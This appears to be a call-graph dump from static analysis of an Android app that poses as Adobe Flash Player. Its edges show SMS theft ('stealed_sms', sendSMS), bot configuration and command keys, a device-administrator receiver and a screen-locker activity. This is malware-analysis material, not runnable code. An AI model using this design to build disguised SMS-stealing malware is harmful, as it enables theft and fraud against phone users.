VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.util.TreeMap: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.util.TreeMap: void <init>()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $i5 = staticinvoke <java.lang.Integer: int parseInt(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.Integer: int parseInt(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>(r25, r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.AdobeUtil dummyMainMethod_com_adobe_flashplayer___AdobeUtil(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.AdobeUtil dummyMainMethod_com_adobe_flashplayer___AdobeUtil(android.content.Intent)>
VIRTUAL edge: $z0 = virtualinvoke $r13.<java.lang.String: boolean contains(java.lang.CharSequence)>("nodata") in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("warn", r1, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<android.content.BroadcastReceiver: void <init>()>() in <com.adobe.flashplayer_.adobeCore: void <init>()> ==> <android.content.BroadcastReceiver: void <init>()>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.FlashW dummyMainMethod_com_adobe_flashplayer___FlashW(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.FlashW dummyMainMethod_com_adobe_flashplayer___FlashW(android.content.Intent)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <java.util.concurrent.TimeUnit: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.util.concurrent.TimeUnit: void <clinit>()>
SPECIAL edge: specialinvoke $r2.<android.content.Intent: void <init>(android.content.Context,java.lang.Class)>($r1, class "Lcom/adobe/flashplayer_/AdobeZCore;") in <com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.Intent: void <init>(android.content.Context,java.lang.Class)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r3) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\rDate: ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r10 = specialinvoke r0.<com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotNetwork", $r1) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" [ End ] ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r16.<com.adobe.flashplayer_.AdobeFlashCore$1: android.os.CountDownTimer start()>() in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <android.os.CountDownTimer: android.os.CountDownTimer start()>
VIRTUAL edge: $r1 = virtualinvoke r4.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r5 = virtualinvoke $r7.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r25 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r24 = virtualinvoke r3.<java.io.File: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String toString()>
STATIC edge: $r37 = staticinvoke <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("BCTMP_") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=stealed_sms&i=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("*", "S") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r16.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r17) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r44 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]:Executed:HTTP") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.adobeCore: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.adobeCore dummyMainMethod_com_adobe_flashplayer___adobeCore(android.content.Intent)> ==> <com.adobe.flashplayer_.adobeCore: void <init>()>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("setFilter") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
CLINIT edge: staticinvoke <android.os.Build$VERSION: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.os.Build$VERSION: void <clinit>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("w", "NOFILTER", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotLocation", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=macros_a_bad&i=macros_a_data") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r15) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $r38 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
SPECIAL edge: specialinvoke $r1.<android.content.Intent: void <init>(android.content.Context,java.lang.Class)>(r0, class "Lcom/adobe/flashplayer_/AdobeFlashCore;") in <com.adobe.flashplayer_.AdobeFlashCore: void onDestroy()> ==> <android.content.Intent: void <init>(android.content.Context,java.lang.Class)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("setFilter[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: $r36 = staticinvoke <java.lang.Class: java.lang.Class forName(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.Class: java.lang.Class forName(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r3 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<android.os.CountDownTimer: void <init>(long,long)>($l0, $l1) in <com.adobe.flashplayer_.MacrosStat$1: void <init>(com.adobe.flashplayer_.MacrosStat,long,long)> ==> <android.os.CountDownTimer: void <init>(long,long)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.FlashURL: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.FlashURL dummyMainMethod_com_adobe_flashplayer___FlashURL(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void <init>()>
SPECIAL edge: $r13 = specialinvoke r0.<com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)>("warn", $r1) in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r1) in <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.Writer: void write(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r9) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r9 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotVer", $r4) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("keySmsGate") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>($r5) in <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r8) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.SystemSWF: void onReceive(android.content.Context,android.content.Intent)>(null, null) in <dummyMainClass: com.adobe.flashplayer_.SystemSWF dummyMainMethod_com_adobe_flashplayer___SystemSWF(android.content.Intent)> ==> <com.adobe.flashplayer_.SystemSWF: void onReceive(android.content.Context,android.content.Intent)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.admin.DeviceAdminReceiver: void <init>()>() in <com.adobe.flashplayer_.ADOBEcoreZa: void <init>()> ==> <android.app.admin.DeviceAdminReceiver: void <init>()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: boolean equals(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]:Executed:HTTP") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer_.adobeCore: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.adobeCore: android.content.Intent getIntent()>
VIRTUAL edge: r34 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r24 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r15.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r16) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $z0 = virtualinvoke r0.<com.adobe.flashplayer_.Prefs: boolean isOnline(android.content.Context)>($r1) in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <com.adobe.flashplayer_.Prefs: boolean isOnline(android.content.Context)>
SPECIAL edge: specialinvoke r3.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r5) in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
VIRTUAL edge: $i0 = virtualinvoke $r20.<java.lang.String: int indexOf(java.lang.String)>("root") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=out_sms&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(";") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r32.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
SPECIAL edge: $r8 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotLocation", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<android.os.CountDownTimer: void <init>(long,long)>($l0, $l1) in <com.adobe.flashplayer_.AdobeZCore$1: void <init>(com.adobe.flashplayer_.AdobeZCore,long,long)> ==> <android.os.CountDownTimer: void <init>(long,long)>
SPECIAL edge: $r10 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotVer", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r1 = virtualinvoke r3.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer.Certificate: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: java.lang.String readLine()>
VIRTUAL edge: virtualinvoke r2.<android.content.Intent: android.content.Intent addFlags(int)>(67108864) in <com.adobe.flashplayer.Certificate$1: void onClick(android.view.View)> ==> <android.content.Intent: android.content.Intent addFlags(int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.packages.ZLocker: android.view.Window getWindow()>() in <com.adobe.packages.ZLocker: void onAttachedToWindow()> ==> <android.app.Activity: android.view.Window getWindow()>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>("BotLocation", $r2) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("setFilter[") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r21, r4, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r3.<java.io.BufferedReader: void <init>(java.io.Reader)>(r4) in <com.adobe.flashplayer.Certificate: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
VIRTUAL edge: $r21 = virtualinvoke $r21.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(" ", "_") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
